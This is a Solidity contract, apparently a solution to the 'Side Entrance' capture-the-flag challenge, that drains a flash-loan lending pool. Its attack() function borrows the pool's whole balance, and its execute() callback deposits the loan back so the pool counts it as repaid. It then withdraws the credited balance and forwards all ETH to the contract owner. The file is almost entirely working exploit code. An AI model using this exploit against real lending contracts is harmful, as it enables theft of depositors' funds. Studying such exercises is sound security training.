// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract AttackSideEntranceLenderPool is Ownable {
  using Address for address;
  using Address for address payable;
  // address immutable private owner;
  address immutable private pool;

  constructor(address _pool) {
    pool = _pool;
    // owner = msg.sender;
  }

  // Allow deposits of ETH (contract is using `sendValue` in `withdraw` function)
  receive() external payable {}

  function attack() external onlyOwner {
    pool.functionCall(abi.encodeWithSignature("flashLoan(uint256)", address(pool).balance));
    pool.functionCall(abi.encodeWithSignature("withdraw()"));
    payable(owner()).sendValue(address(this).balance);
  }

  function execute() external payable {
    pool.functionCallWithValue(abi.encodeWithSignature("deposit()"), address(this).balance);
  }
}